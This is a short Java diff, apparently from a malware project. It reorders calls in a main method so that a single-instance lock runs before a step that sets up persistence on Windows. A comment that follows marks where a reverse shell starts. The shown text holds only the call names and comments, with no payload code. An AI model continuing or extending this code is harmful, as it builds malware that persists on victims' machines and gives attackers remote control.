@@ -12,12 +12,14 @@ public class Main {
 
 
     public static void main(String[] args) {
+//        check if the software is already alive
+        LockMechanismUtil.startLockMechanism();
+
 
 //        try to establish persistence
         PersistMalware persistMalware = new PersistMalware();
         System.out.println(persistMalware.createPersistenceWindows());
-//        check if the software is already alive
-        LockMechanismUtil.startLockMechanism();
+
 
 
 //        start reverse shell
